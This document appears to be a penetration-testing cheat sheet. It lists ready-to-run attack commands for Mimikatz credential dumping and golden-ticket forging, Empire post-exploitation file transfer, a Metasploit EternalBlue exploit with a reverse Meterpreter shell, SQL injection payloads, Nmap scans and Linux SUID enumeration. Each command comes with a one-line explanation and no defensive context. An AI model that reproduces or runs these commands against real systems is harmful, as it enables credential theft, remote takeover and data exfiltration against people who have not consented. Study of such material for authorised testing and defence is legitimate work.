### 1. Mimikatz Commands
Mimikatz is a tool for extracting credentials from Windows systems. Here are some examples:

#### Extract Logon Passwords
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
- What it does: Dumps plaintext passwords, hashes, and Kerberos tickets from memory.

#### Extract Kerberos Tickets
Invoke-Mimikatz -Command '"privilege::debug" "kerberos::list"'
- What it does: Lists Kerberos tickets stored in memory.

#### Golden Ticket Attack
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-123456789-1234567890-123456789 /krbtgt:hash /ticket:golden.kirbi"'
- What it does: Creates a "golden ticket" for persistent domain access.

---

### 2. PowerShell Empire Commands
Empire is a post-exploitation framework for PowerShell. Here are some examples:

#### Run a Shell Command
shell whoami
- What it does: Executes a command on the target system (e.g., whoami to check the current user).

#### Download a File
download C:\path\to\file.txt
- What it does: Downloads a file from the target system.

#### Upload a File
upload C:\local\file.txt C:\remote\path\file.txt
- What it does: Uploads a file to the target system.

---

### 3. Metasploit Commands
Metasploit is a penetration testing framework. Here are some examples:

#### Exploit a Vulnerability
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.1
exploit
- What it does: Exploits the EternalBlue vulnerability to gain a Meterpreter shell.

#### Meterpreter Shell Commands
meterpreter > sysinfo
meterpreter > shell
meterpreter > download C:\path\to\file.txt
- What it does: Gathers system info, opens a shell, and downloads files.

---

### 4. Nmap Commands
Nmap is a network scanning tool. Here are some examples:

#### Scan for Open Ports
nmap -sS 192.168.1.1
- What it does: Performs a SYN scan to detect open ports.

#### OS Detection
nmap -O 192.168.1.1
- What it does: Attempts to identify the operating system of the target.

#### Vulnerability Scan
nmap --script vuln 192.168.1.1
- What it does: Runs vulnerability detection scripts against the target.

---

### 5. SQL Injection Commands
SQL injection is a technique for exploiting database vulnerabilities. Here are some examples:

#### Basic SQL Injection
' OR 1=1 --
- What it does: Bypasses authentication by making the query always true.

#### Extract Database Version
' UNION SELECT 1,@@version,3 --
- What it does: Retrieves the database version.

#### Dump Table Data
' UNION SELECT 1,table_name,3 FROM information_schema.tables --
- What it does: Lists all tables in the database.

---

### 6. Wireshark Filters
Wireshark is a network protocol analyzer. Here are some examples:

#### Filter by IP
ip.addr == 192.168.1.1
- What it does: Displays traffic to/from a specific IP.

#### Filter by Protocol
tcp.port == 80
- What it does: Displays HTTP traffic.

#### Filter by Keyword
frame contains "password"
- What it does: Displays packets containing the word "password."

---

### 7. Linux Privilege Escalation
Here are some commands for privilege escalation on Linux systems:

#### Find SUID Files
find / -perm -4000 2>/dev/null
- What it does: Lists files with the SUID bit set (potential privilege escalation targets).